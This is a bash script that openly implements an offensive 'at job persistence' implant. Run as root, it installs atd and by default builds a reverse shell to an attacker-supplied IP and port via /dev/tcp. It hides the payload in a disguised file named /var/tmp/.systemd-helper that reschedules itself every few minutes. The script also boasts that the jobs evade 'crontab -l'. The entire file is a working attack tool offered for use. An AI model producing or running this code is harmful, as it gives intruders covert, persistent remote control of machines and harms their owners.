#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

echo " [*] At Job Persistence [*] "
echo ""
echo "Creates self-rescheduling at jobs (invisible to crontab -l)."
echo ""

# Check if atd is available and running
if ! command -v at &>/dev/null; then
    echo "[*] Installing 'at' package..."
    apt-get install -y at 2>/dev/null
fi

systemctl start atd 2>/dev/null
systemctl enable atd 2>/dev/null

read -p "Enter your payload or command (or leave empty for reverse shell): " payload

if [ -z "$payload" ]; then
    read -p "Enter the IP address: " ip
    read -p "Enter the port: " port
    payload="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
fi

read -p "Enter interval in minutes (default: 5): " interval
interval="${interval:-5}"

# Create a hidden helper script that runs payload + reschedules itself
HELPER="/var/tmp/.systemd-helper"

cat > "$HELPER" <<ATEOF
#!/bin/bash
$payload &>/dev/null &
echo "/bin/bash $HELPER" | at now + $interval minutes 2>/dev/null
ATEOF

chmod +x "$HELPER"

# Schedule the first execution
echo "/bin/bash $HELPER" | at now + 1 minute 2>/dev/null

clear

echo "[*] Success!! At job persistence implanted. [*]"
echo "[*] Self-rescheduling every $interval minutes. [*]"
echo "[*] Jobs only visible via 'atq', not 'crontab -l'. [*]"

sleep 1

clear
